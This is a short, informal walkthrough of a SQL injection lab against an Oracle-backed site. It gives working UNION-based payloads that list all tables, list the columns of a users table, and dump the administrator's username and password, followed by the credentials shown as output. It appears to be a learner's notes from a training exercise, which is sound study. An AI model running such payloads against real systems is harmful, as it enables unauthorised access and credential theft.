==> SQLi lab 6: getting the contents of oracle database
==> goal: get the data stored in oracle data base from that find the table that stores username and passwords and get the administrator's
credencials and log in to complete the lab

tasks:
1. how many columns query is using? : by seeing the site we can get that it has 2 columns
2. what are the datatypes of those columns? : based on what site shows we know that both the column's datatype is text
3. version of database?: to print the contents for this attack we don't need perfect version but as provided in our goal we know that its a oracle
database and that's enough to refine our quries.
4. we get the name of the table which contains the username and passwords
5. based on the table we get we need to find column names where username and password is stored
6. final step is find the admin's username and password and log in to the site

> getting the name of the table which is containing usernames and passwords (user info)
payload: ' UNION SELECT table_name,NULL FROM all_tables--
output: we get all the tables from which we get this: USERS_GMMZXR

> based on the table we find let's see all the columns in that table and if it contains username and password stored columns
payload: ' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = 'USERS_GMMZXR'--
output: columns for username: USERNAME_QRZPNE , password: PASSWORD_SWJIQL

> lets use these info and find out the administrator's username and password
payload: ' UNION SELECT USERNAME_QRZPNE, PASSWORD_SWJIQL FROM USERS_GMMZXR--
output: username: administrator , password: 095577c81hefc9oughie

> now just log in using this credencials and done the lab is solved..
